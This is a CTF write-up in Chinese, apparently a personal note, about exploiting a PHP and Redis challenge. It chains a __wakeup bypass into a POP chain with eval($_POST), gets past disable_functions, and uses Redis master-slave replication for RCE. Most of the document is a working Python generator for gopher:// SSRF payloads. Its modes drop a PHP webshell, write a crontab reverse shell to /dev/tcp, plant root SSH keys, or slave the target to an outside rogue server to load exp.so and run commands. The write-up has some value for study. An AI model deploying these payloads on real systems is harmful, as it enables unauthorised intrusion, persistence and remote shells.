tags:: CTF/Redis

- # 思路
	- 绕过wakeup实现POP
	- ~~使用Redis主从复制获取root~~使用蚁剑绕过disable_function
- # 绕过wakeup实现POP
	- 题目判断了序列化字符串中类的字段数是否为1，而wakeup绕过只需要类的字段数和实际的字段数不同
	- 我们可以构建两个字段，然后将字段数改为1来绕过wakeup
	- ```php
	  $o = new B();
	  $o -> a = new A();
	  $o -> a -> code = 'eval($_POST[data]);';
	  $o -> a -> b = "114514";
	  
	  $s = serialize($o);
	  $s = str_replace('"A":2:', '"A":1:', $s);
	  preg_match_all('/"[BA]":(.*?):/s',$s,$result);
	  echo "<br>payload: <br>";
	  echo urlencode($s);
	  ```
- # 使用蚁剑绕过disable_function
	- RT，安装相应插件即可执行任意linux shell命令，在根目录看到flag
- # 使用Redis主从复制获取root
	- 看到config.php.swp
		- ```shell
		  # user @ Hack in ~/toolkit/burst_kit/test on git:master x .venv [10:18:56] 
		  $ strings .config.php.swp 
		  b0VIM 8.0
		  ruozhi
		  DESKTOP-O3MVQS3
		  /mnt/c/Users/adim/Desktop/a.php
		  3210
		  #"! 
		  define("REDIS_PASS","you_cannot_guess_it");
		  define("DB_DATABASE","test");
		  define("DB_PASSWOrd","");
		  define("DB_USERNAME","root");
		  define("DB_HOST","localhost");
		  <?php
		  ```
	- 使用[Redis Rogue Server](https://github.com/Dliv3/redis-rogue-server)作为服务端，[这里](https://www.secpulse.com/archives/132215.html)的脚本的修改版（ ((6478166b-ea87-42d3-b282-45bd4bb3d831)) ）作为payload生成器
	- 在脚本中填写相关字段生成payload，在VPS上部署rouge server并将附带的exp.so复制到/tmp下，最后将payload传上目标即可
- # 脚本
	- redis payload生成的脚本
	  id:: 6478166b-ea87-42d3-b282-45bd4bb3d831
		- ```python
		  #!/usr/local/bin python
		  # coding=utf8
		  
		  try:
		      from urllib import quote
		  except:
		      from urllib.parse import quote
		  
		  
		  def generate_shell(filename, path, passwd, payload):
		      cmd = ["flushall",
		             "set 1 {}".format(payload),
		             "config set dir {}".format(path),
		             "config set dbfilename {}".format(filename),
		             "save"
		             ]
		      if passwd:
		          cmd.insert(0, "AUTH {}".format(passwd))
		      return cmd
		  
		  
		  def generate_reverse(filename, path, passwd, payload):  # centos
		  
		      cmd = ["flushall",
		             "set 1 {}".format(payload),
		             "config set dir {}".format(path),
		             "config set dbfilename {}".format(filename),
		             "save"
		             ]
		      if passwd:
		          cmd.insert(0, "AUTH {}".format(passwd))
		      return cmd
		  
		  
		  def generate_sshkey(filename, path, passwd, payload):
		      cmd = ["flushall",
		             "set 1 {}".format(payload),
		             "config set dir {}".format(path),
		             "config set dbfilename {}".format(filename),
		             "save"
		             ]
		      if passwd:
		          cmd.insert(0, "AUTH {}".format(passwd))
		      return cmd
		  
		  
		  def generate_rce(lhost, lport, passwd, command="cat /etc/passwd"):
		      exp_filename = "exp.so"
		      cmd = [
		          "SLAVEOF {} {}".format(lhost, lport),
		          "CONFIG SET dir /tmp/",
		          "config set dbfilename {}".format(exp_filename),
		          "MODULE LOAD /tmp/{}".format(exp_filename),
		          "system.exec {}".format(command.replace(" ", "${IFS}")),
		          # "SLAVEOF NO ONE",
		          # "CONFIG SET dbfilename dump.rdb",
		          # "system.exec rm${IFS}/tmp/{}".format(exp_filename),
		          # "MODULE UNLOAD system",
		          "POST"
		      ]
		      if passwd:
		          cmd.insert(0, "AUTH {}".format(passwd))
		      return cmd
		  
		  
		  def rce_cleanup():
		      exp_filename = "exp.so"
		      cmd = [
		          "SLAVEOF NO ONE",
		          "CONFIG SET dbfilename dump.rdb",
		          "system.exec rm${IFS}/tmp/{}".format(exp_filename),
		          "MODULE UNLOAD system",
		          "POST"
		      ]
		      if passwd:
		          cmd.insert(0, "AUTH {}".format(passwd))
		      return cmd
		  
		  
		  def redis_format(arr):
		      CRLF = "\r\n"
		      redis_arr = arr.split(" ")
		      cmd = ""
		      cmd += "*" + str(len(redis_arr))
		      for x in redis_arr:
		          cmd += CRLF + "$" + str(len((x))) + CRLF + x
		      cmd += CRLF
		      return cmd
		  
		  
		  def generate_payload(ip, port, passwd, mode):
		      payload = "test"
		  
		      if mode == 0:
		          filename = "shell.php"
		          path = "/var/www/html"
		          shell = "\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
		  
		          cmd = generate_shell(filename, path, passwd, shell)
		  
		      elif mode == 1:
		          filename = "root"
		          path = "/var/spool/cron/"
		          shell = "\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.1.1/2333 0>&1\n\n"
		  
		          cmd = generate_reverse(filename, path, passwd, shell)
		  
		      elif mode == 2:
		          filename = "authorized_keys"
		          path = "/root/.ssh/"
		          pubkey = "\n\nssh-rsa "
		  
		          cmd = generate_sshkey(filename, path, passwd, pubkey)
		  
		      elif mode == 3:
		          # rogue server貌似需要将exp.so放在/tmp下
		          lhost = "198.98.53.82" # TODO: rogue server的IP
		          lport = "21000" # TODO: rogue server的端口号
		          command = "" # TODO: 此处运行shell command, 填写reverse shell的payload
		  
		          cmd = generate_rce(lhost, lport, passwd, command)
		  
		      elif mode == 31:
		          cmd = rce_cleanup()
		  
		      protocol = "gopher://"
		      payload = protocol + ip + ":" + port + "/_"
		  
		      for x in cmd:
		          payload += quote(redis_format(x))
		      return payload
		  
		  
		  if __name__ == "__main__":
		      # 0 for webshell ; 1 for re shell ; 2 for ssh key ; 3 for redis rce ; 31 for rce clean up
		      # suggest cleaning up when mode 3 used
		      mode = 3
		  
		      # need auth or not
		      passwd = "you_cannot_guess_it"
		  
		      ip = "127.0.0.1" # 目标的IP和端口
		      port = "6379"
		  
		      p = generate_payload(ip, port, passwd, mode)
		      print(p)
		  
		  ```